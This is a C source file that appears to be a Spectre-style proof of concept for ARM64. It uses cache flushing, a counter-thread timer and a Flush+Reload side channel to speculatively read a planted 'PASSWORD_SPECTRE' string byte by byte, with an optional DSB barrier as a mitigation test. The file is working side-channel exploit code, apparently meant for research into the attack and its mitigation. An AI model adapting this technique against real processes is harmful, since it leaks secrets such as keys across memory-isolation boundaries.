#include <stdio.h>
#include <stdint.h>
#include <pthread.h>

#define MITIGATION

#define LEN 16
#define MAX_TRIES 10000

volatile uint64_t counter = 0;
uint64_t miss_min = 0;
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

unsigned char **memory_slot_ptr[256];
unsigned char *memory_slot[256];

unsigned char secret_key[] = "PASSWORD_SPECTRE";
unsigned char public_key[] = "################";

uint8_t channel[256 * 512]; // side channel to extract secret phrase
volatile uint8_t tmp = 0;

static inline void flush(void *addr)
{
    asm volatile("DC CIVAC, %[ad]"
                 :
                 : [ad] "r"(addr));
    asm volatile("DSB SY");
}

void *inc_counter(void *a)
{
    while (1)
    {
        counter++;
        asm volatile("DMB SY");
    }
}

static uint64_t timed_read(volatile uint8_t *addr)
{
    uint64_t ns = counter;

    /*
     * Reference: http://www.ethernut.de/en/documents/arm-inline-asm.html
     */
    asm volatile(
        "DSB SY\n"
        "LDR X5, [%[ad]]\n"
        "DSB SY\n"
        :
        : [ad] "r"(addr)
        : "x5");

    return counter - ns;
}

uint64_t measure_latency()
{
    uint64_t ns;
    uint64_t min = 0xFFFFF;

    for (int r = 0; r < 1000; r++)
    {
        flush(&array1[0]);
        ns = timed_read(&array1[0]);
        if (ns < min)
            min = ns;
    }

    return min;
}

unsigned char **calculate_address(unsigned char **memory_slot_slow_ptr)
{
    unsigned char **tmp = memory_slot_slow_ptr;
    for (volatile int z = 0; z < 2; z++)
    {
        // tmp += (z % 2 ? 1 : -1);
        asm volatile("DMB SY");
    }
    return tmp;
}

char *pointers[100];

int h = 10;
int j = 11;
void victim_function(size_t idx, size_t offset, int f, int g)
{
    pointers[1] = (char *)secret_key;

    // flush(&f);
    // flush(&g);
    flush(&h);
    flush(&j);
    pointers[j - h] = (char *)public_key;

#ifdef MITIGATION
    asm volatile("DSB SY");
#endif

    // Access the public value, and the secret value is specutively accessed.
    tmp ^= channel[(int)((pointers[1])[idx]) * 512];
}

// void victim_function(size_t idx, size_t offset)
// {
//     // At this point, memory_slot_slow_ptr -> Address of "secret_key"
//     unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;

//     // printf("Before: %c\n", (*memory_slot_slow_ptr)[idx]);

//     // Now, memory_slot_slow_ptr -> Address of "publc_key"
//     // *calculate_address(memory_slot_slow_ptr) = public_key;
//     flush(memory_slot_ptr);

//     *memory_slot_ptr = public_key;

//     // printf("After: %c\n", (*memory_slot_slow_ptr)[idx]);

//     // Access the public value, and the secret value is spectively accessed.
//     tmp ^= channel[(*memory_slot_slow_ptr)[idx] * 512];
// }

void readByte(int idx, uint8_t value[2], int score[2])
{
    int results[256] = {0};
    int i, j, k, mix_i;
    register uint64_t elapsed;
    unsigned int junk = 0;

    for (int tries = 999; tries > 0; tries--)
    {
        // memory_slot_ptr -> memory_slot -> Address of "secret_key"
        *memory_slot_ptr = memory_slot;
        *memory_slot = secret_key;

        flush(memory_slot_ptr);
        for (int i = 0; i < 256; i++)
            flush(&channel[i * 512]);

        asm volatile("DMB SY");

        victim_function(idx, 0, tries * 2, 1 - tries * 2);

        for (int i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            elapsed = timed_read(&channel[mix_i * 512]);

            if (elapsed <= miss_min && mix_i != public_key[idx] && mix_i != 0x00 && mix_i != 0x0D)
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (j == 0)
            continue;

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(void)
{
    for (int i = 0; i < sizeof(channel); ++i)
        channel[i] = 1; /* write to channel so in RAM not copy-on-write zero pages */

    // Initialize counter
    pthread_t inc_counter_thread;
    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL))
    {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }
    // let the bullets fly a bit ....
    while (counter < 10000000)
        ;

    asm volatile("DSB SY");

    miss_min = measure_latency();
    // if (miss_min == 0)
    // {
    //     fprintf(stderr, "Unreliable access timing\n");
    //     exit(EXIT_FAILURE);
    // }
    miss_min -= 1;
    printf("miss_min %d\n", (int)miss_min);

    uint8_t value[2];
    int score[2];

    for (int idx = 0; idx < LEN; idx++)
    {
        readByte(idx, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
    // printf("%d\n", tmp);
}
